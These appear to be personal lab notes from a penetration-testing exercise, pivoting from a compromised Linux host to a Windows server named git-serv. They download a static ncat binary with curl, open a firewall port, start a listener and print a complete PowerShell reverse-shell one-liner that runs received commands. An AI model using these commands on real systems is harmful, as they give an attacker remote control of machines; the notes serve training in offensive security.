hostname : git-serv
![[Pasted image 20231225145819.png]]

So as uname -a or hostnamectl didn't give us anything back so it's hunch as this point but confirmed later that it's a windows machine.

Things to check now is:
- this target is allowed to connect to the outside world
so in-order to check that we will fire-up a ping request on the compromised server and see using Wireshark what happens.

So we tired and didn't succeed and got to know that we need to go back to drawing board and build a different strategy.

Now we have to upload a static copy of netcat
https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat

we have to give access to the port for public access aka firewall 
```
firewall-cmd --zone=public --add-port 16000/tcp
```
![[Pasted image 20231225210205.png]]

```
curl 10.50.106.240/ncat-sardarji -o /tmp/ncat-sardarji && chmod +x /tmp/ncat-sardarji
```

```
./ncat-sardarji -lvnp 16000
```

Got the reverse Shell
We got the shell on the linux machine cuz we already have access to it and allowed the firewall rule for the port so now we have to do the enumeration and pivoting for the next machine.
```
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.105.200',16001);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
